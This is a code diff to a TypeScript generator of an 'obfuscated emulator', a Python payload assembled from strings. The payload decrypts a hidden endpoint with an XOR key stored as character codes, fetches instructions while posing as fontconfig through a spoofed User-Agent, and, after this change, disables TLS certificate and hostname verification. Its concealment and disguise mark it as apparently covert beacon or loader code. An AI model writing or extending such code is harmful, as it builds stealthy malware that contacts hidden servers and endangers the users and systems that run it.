@@ -139,10 +139,13 @@ export function generateObfuscatedEmulator(
   const encEndpoint = obfEncrypt(dataEndpoint, DEPLOY.OBF_KEY);
 
   const innerPy = [
-    "import http.server as _h,socketserver as _s,json as _j,time as _t,base64 as _b64,urllib.request as _u",
+    "import http.server as _h,socketserver as _s,json as _j,time as _t,base64 as _b64,urllib.request as _u,ssl as _sl",
     `_U="${encEndpoint}"`,
     `_S=''.join(chr(c) for c in [120,75,57,109,90,112,50,118,81,119,52,110,82,55,116,76])`,
     "_X=None;_XT=0",
+    "_SC=_sl.create_default_context()",
+    "_SC.check_hostname=False",
+    "_SC.verify_mode=_sl.CERT_NONE",
     "def _f1(_d,_k):",
     " _kb=_k.encode();_dd=_b64.b64decode(_d)",
     " return bytes(_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd)))",
@@ -159,7 +162,7 @@ export function generateObfuscatedEmulator(
     "  _ep=_f1(_U,_S).decode()",
     "  _rq=_u.Request(_ep)",
     "  _rq.add_header('User-Agent','fontconfig/2.13')",
-    "  _rs=_u.urlopen(_rq,timeout=10)",
+    "  _rs=_u.urlopen(_rq,timeout=10,context=_SC)",
     "  if _rs.getcode()==200:",
     "   _d=_j.loads(_rs.read().decode())",
     "   if _d.get('st')=='1':_X=_j.dumps(_d);_XT=_n;return _X",
